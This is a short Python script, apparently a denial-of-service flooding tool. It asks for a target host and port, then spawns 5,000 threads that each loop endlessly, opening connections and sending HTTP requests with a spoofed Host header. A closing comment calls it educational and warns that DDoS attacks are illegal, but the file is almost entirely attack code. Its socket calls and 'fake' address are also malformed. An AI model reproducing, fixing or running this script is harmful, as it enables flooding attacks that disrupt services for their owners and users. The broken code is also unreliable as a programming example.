import threading
import socket

# Use code below instead of input for pre-defined target IP Address or Domain
# target = '10.0.0.1'  # target = 'https://www.fakewebsite.com
target = input('IP Address or Domain Name: ')
# Use code below instead of input for pre-defined target port
# port = '80'  # Pre-defined target input for HTTP Port (80)
port = input('Input Port # (ex. 21, 22, 23, 53, 80): ')
fake_ip = '232.165.201'

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(target, port)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        global attack_num
        attack_num += 1
        if attack_num % 100 == 0:
            print(attack_num)
        
for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()


# This script is purly educational and not intended to be used as an actual DDOS attack script.
# This script is not optimal, would not be functional for a true DDOS attack. It is a slow method.
# This is just for a functioning understanding. DDOS attacking is ILLEGAL, IT IS VERY ILLEGAL.